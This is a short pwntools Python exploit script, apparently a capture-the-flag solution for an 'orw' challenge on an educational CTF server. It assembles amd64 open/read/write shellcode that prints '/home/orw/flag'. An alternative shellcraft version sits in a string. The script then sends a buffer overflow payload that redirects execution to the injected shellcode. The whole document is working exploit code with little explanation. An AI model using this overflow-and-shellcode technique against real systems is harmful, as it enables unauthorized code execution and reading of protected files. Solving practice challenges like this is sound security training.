#!usr/bin/python3

from pwn import *

context.arch = 'amd64'

y = remote('edu-ctf.csie.org', 10171)

#y = process( './orw' )
#pause()

sc = asm('''
        mov rax, 0x67616c662f77
        push rax
        mov rax, 0x726f2f656d6f682f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall
        // open( "/home/orw/flag", 0, 0 )
        
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x50
        mov rax, 0
        syscall
        // read(fd, rsp, 0x50)

        mov rdi, 1
        mov rax, 1
        syscall
        // wirte(1, rsp, 0x50)
        
''')

'''
sc = asm(
        shellcraft.pushstr( "/home/orw/flag" ) +
        shellcraft.open('rsp', 0, 0) +
        shellcraft.read('rax', 'rsp', 0x50) +
        shellcraft.write(1, 'rsp', 0x50)
)
'''

y.sendafter('>', sc)

y.sendline( b'a' * 0x18 + p64( 0x6010a0 ) )

y.interactive()
